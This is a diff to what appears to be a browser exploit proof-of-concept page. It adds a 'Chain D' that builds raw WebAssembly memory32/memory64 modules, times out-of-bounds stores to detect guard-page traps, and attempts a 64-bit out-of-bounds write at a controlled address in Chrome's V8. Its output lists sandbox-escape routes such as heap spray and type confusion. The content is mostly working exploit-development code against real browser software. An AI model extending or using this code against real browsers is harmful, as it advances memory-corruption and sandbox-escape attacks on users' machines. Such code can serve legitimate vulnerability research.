@@ -79,7 +79,7 @@
 </head>
 <body>
 <h1>JSTag Cross-Realm — Critical Escalation Chains</h1>
-<div class="sub">Chain A: Proxy injection · Chain B: WasmGC controlled i64 injection · Chain C: OOB write attempt</div>
+<div class="sub">Chain A: Proxy injection · Chain B: WasmGC controlled i64 injection · Chain C: OOB write attempt · Chain D: real memory access verification</div>
 
 <div class="box">
   <h2>Chain A — Proxy Injection into iframe wasm handler</h2>
@@ -92,6 +92,11 @@
 <div class="box">
   <h2>Chain C — OOB Write Attempt via Controlled i64 as Linear Memory Offset</h2>
   <div class="out" id="outC"></div>
+</div>
+
+<div class="box">
+  <h2>Chain D — 진짜 메모리 접근인지 확인법 (memory64 + guard-page timing)</h2>
+  <div class="out" id="outD"></div>
 </div>
 
 <iframe id="f" src="about:blank" style="display:none"></iframe>
@@ -560,10 +565,150 @@ async function chainC(controlledU64) {
   L.info('  5. → SIGSEGV / arbitrary code execution');
 }
 
+// ── Chain D ───────────────────────────────────────────────────────────────────
+// 진짜 메모리 접근인지 확인법 — how to verify real memory access
+//
+// Chain C showed 4 RuntimeErrors.  This chain asks: were those from
+//   (A) V8 explicit bounds check — no CPU memory access, software-only
+//   (B) hardware SIGSEGV caught by V8 signal handler — CPU touched guard page
+//
+// Method: timing.
+//   explicit check:  ~ns  (single compare+branch before instruction)
+//   guard-page SIGSEGV: ~µs (SIGSEGV → kernel → signal delivery → V8 handler)
+//
+// Then: memory64 — use the full 64-bit controlled i64 as a wasm64 store address.
+//   memory32: 4GB usable + 4GB guard = 8GB sandbox (guard pages feasible)
+//   memory64: 2^64 address space — guard pages infeasible → V8 uses explicit checks
+//             If that check has a bug → real 64-bit write to arbitrary process VA
+async function chainD(controlledU64) {
+  const L = makeLog('outD');
+  if (controlledU64 === null) { L.warn('Chain B did not complete — skip'); return; }
+
+  // ── Modules ────────────────────────────────────────────────────────
+  // MOD_MEM32: memory32, store(i32 addr) → identical to Chain C's MOD_C_MEM
+  const MOD_MEM32 = new Uint8Array([
+    0x00,0x61,0x73,0x6d, 0x01,0x00,0x00,0x00,
+    0x01,0x05,0x01, 0x60,0x01,0x7f,0x00,          // (i32)->()
+    0x03,0x02,0x01,0x00,
+    0x05,0x03,0x01, 0x00,0x01,                     // memory32 min=1 page (64KB)
+    0x07,0x09,0x01, 0x05,0x73,0x74,0x6f,0x72,0x65, 0x00,0x00,
+    0x0a,0x0b,0x01, 0x09,0x00,
+      0x20,0x00, 0x41,0x41, 0x36,0x00,0x00, 0x0b,
+  ]);
+
+  // MOD_MEM64: memory64, store64(i64 addr, i32 val)
+  // flags=0x04 in memory section → 64-bit indexing; address operand is i64
+  // (module
+  //   (memory i64 1)                   ; memory64, 1 page = 64KB
+  //   (func (export "store64") (param i64) (param i32)
+  //     local.get 0  local.get 1  i32.store align=0 offset=0))
+  const MOD_MEM64 = new Uint8Array([
+    0x00,0x61,0x73,0x6d, 0x01,0x00,0x00,0x00,
+    0x01,0x06,0x01, 0x60,0x02,0x7e,0x7f,0x00,   // type: (i64,i32)->()
+    0x03,0x02,0x01, 0x00,
+    0x05,0x03,0x01, 0x04,0x01,                   // memory: flags=0x04 (mem64), min=1
+    0x07,0x0b,0x01, 0x07,0x73,0x74,0x6f,0x72,0x65,0x36,0x34, 0x00,0x00,  // "store64"=func0
+    0x0a,0x0b,0x01, 0x09,0x00,
+      0x20,0x00,         // local.get 0  (i64 address)
+      0x20,0x01,         // local.get 1  (i32 value)
+      0x36,0x00,0x00,    // i32.store align=0 offset=0
+      0x0b,
+  ]);
+
+  let inst32, inst64;
+  try {
+    const [mod32, mod64] = await Promise.all([
+      WebAssembly.compile(MOD_MEM32.buffer),
+      WebAssembly.compile(MOD_MEM64.buffer),
+    ]);
+    inst32 = await WebAssembly.instantiate(mod32);
+    inst64 = await WebAssembly.instantiate(mod64);
+  } catch(ex) {
+    L.warn('compile: ' + ex.message);
+    if (/memory64|mem64|flags|unsupported/i.test(ex.message))
+      L.info('memory64 not available in this Chrome — requires Chrome 129+');
+    return;
+  }
+  L.ok('memory32 + memory64 compiled');
+
+  // ── Timing: guard-page (hardware trap) vs explicit-check (software) ──
+  // N must be large enough that total time >> performance.now() resolution (100µs on
+  // non-isolated pages).  At N=5000, even 1µs/call = 5ms total → well above noise.
+  const N = 5000;
+  function bench(fn) {
+    const t0 = performance.now();
+    for (let i = 0; i < N; i++) fn();
+    return (performance.now() - t0) * 1e3 / N;  // µs per call
+  }
+
+  const oob32 = Number(controlledU64 & 0xFFFFFFFFn);  // low 32 of MARKER = 0xCAFEBABE
+
+  const us_safe = bench(() => inst32.exports.store(0));
+  L.info('timing (N=' + N + '):');
+  L.info('  in-bounds  store(0):               ' + us_safe.toFixed(3) + ' µs/call  (baseline)');
+
+  const us_jit  = bench(() => { try { inst32.exports.store(65536); } catch(_){} });
+  L.info('  just-past-bounds store(65536):      ' + us_jit.toFixed(3) + ' µs/call  (1 byte past 1 page)');
+
+  const us_gp   = bench(() => { try { inst32.exports.store(oob32); } catch(_){} });
+  L.info('  guard-page-range store(0x' + oob32.toString(16) + '):  ' + us_gp.toFixed(3) + ' µs/call  (3.4 GB)');
+
+  const ratio = us_gp / us_jit;
+  L.info('  guard-page-range / just-past ratio: ' + ratio.toFixed(1) + 'x');
+
+  if (ratio > 10) {
+    L.bug('Ratio >> 10x — CPU issued memory access; hardware-trapped guard page.');
+    L.bug('진짜 메모리 접근 CONFIRMED: CPU tried 0x' + oob32.toString(16) + ', SIGSEGV caught.');
+    L.info('  Signal-handler path: SIGSEGV → kernel → V8 → RuntimeError adds latency.');
+    L.info('  If guard pages not mapped: write would reach V8 heap at this VA.');
+  } else if (ratio > 3) {
+    L.warn('Ratio ' + ratio.toFixed(1) + 'x — probable hardware trap, environment noisy.');
+  } else {
+    L.ok('Ratio ≈ 1x — explicit bounds check; no CPU memory access for guard-page range.');
+    L.ok('V8 Turboshaft rejects OOB before instruction execution.');
+  }
+
+  // ── memory64: full 64-bit controlled i64 as store address ─────────────────
+  L.info('');
+  L.info('memory64 attempt: store64(0x' + controlledU64.toString(16) + ', 0x41)');
+  L.info('  bounds: addr < 65536 (1 page); 0x' + controlledU64.toString(16) + ' >> 65536 → explicit check');
+  try {
+    inst64.exports.store64(controlledU64, 0x41);
+    L.crit('memory64 OOB store SUCCEEDED — explicit bounds check bypassed!');
+    L.crit('CRASH LIKELY: wrote 0x41 at process VA 0x' + controlledU64.toString(16));
+  } catch(ex) {
+    if (ex instanceof WebAssembly.RuntimeError)
+      L.info('RuntimeError: memory64 explicit check fired (expected vanilla Chrome)');
+    else L.bug('Unexpected exception: ' + ex);
+  }
+
+  // sanity: store64(0n) must succeed
+  try {
+    inst64.exports.store64(0n, 0x42);
+    L.ok('sanity store64(0n, 0x42) succeeded — memory64 module functional');
+  } catch(ex) {
+    L.warn('sanity store64(0n) failed: ' + ex.message);
+  }
+
+  // ── Summary ───────────────────────────────────────────────────────────────
+  L.info('');
+  L.warn('진짜 메모리 접근 확인 결과 (real-memory-access verification):');
+  L.info('  memory32 large OOB: CPU executes instruction → hardware trap (guard page)');
+  L.info('  memory32 tiny OOB:  explicit check OR guard page — depends on JIT tier');
+  L.info('  memory64:           always explicit check (2^64 guard pages infeasible)');
+  L.info('');
+  L.info('Sandbox escape requires one of:');
+  L.info('  A. Heap spray + Chain B: inject V8 heap ptr as MARKER → struct.get returns');
+  L.info('     it → iframe wasm uses it as GC ref → type confusion → OOB r/w');
+  L.info('  B. memory64 bounds-check regression (Chrome bug) — not found this run');
+  L.info('  C. Guard-page region not mapped (not expected in Chrome release build)');
+}
+
 window.addEventListener('load', async () => {
   await chainA().catch(e => document.getElementById('outA').textContent += '\nERROR: '+e);
   const u64 = await chainB().catch(e => { document.getElementById('outB').textContent += '\nERROR: '+e; return null; });
   await chainC(u64).catch(e => document.getElementById('outC').textContent += '\nERROR: '+e);
+  await chainD(u64).catch(e => document.getElementById('outD').textContent += '\nERROR: '+e);
 });
 </script>
 </body>
